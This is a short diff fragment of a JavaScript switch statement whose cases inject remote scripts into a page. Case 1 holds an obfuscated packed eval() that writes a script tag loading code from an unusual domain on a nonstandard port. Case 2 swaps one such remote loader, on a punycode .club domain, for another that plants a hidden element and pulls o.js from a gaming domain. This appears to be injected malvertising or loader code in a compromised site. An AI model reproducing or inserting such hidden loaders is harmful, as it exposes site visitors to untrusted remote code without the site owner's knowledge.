@@ -159,7 +159,14 @@ case 1:
 eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('d.b(\'<0 a="9://8.7.6:5/4/c-3-2.1"><\\/0>\');',14,14,'script|js|22|414|cc|18443|top|abie10|www|https|src|writeln||document'.split('|'),0,{}))
 break;
 case 2:
-document.write('<script src="https://xn--wxtr9fwyxk9c.club:12443/ty/x-8322-33.js"><\/script>');
+document.writeln("<script>");
+document.writeln("    (function () {");
+document.writeln("        var id = \'8409388612546995900-10352\';");
+document.writeln("        document.write(\'<ins style=\'display:none!important\' id=\'\' + id + \'\'></ins>\');");
+document.writeln("        (window.adbyunion = window.adbyunion || []).push(id);");
+document.writeln("    })();");
+document.writeln("</script>");
+document.writeln("<script async  src=\'https://alibu.2526game.com/o.js\'></script>");
 break;
 }
 
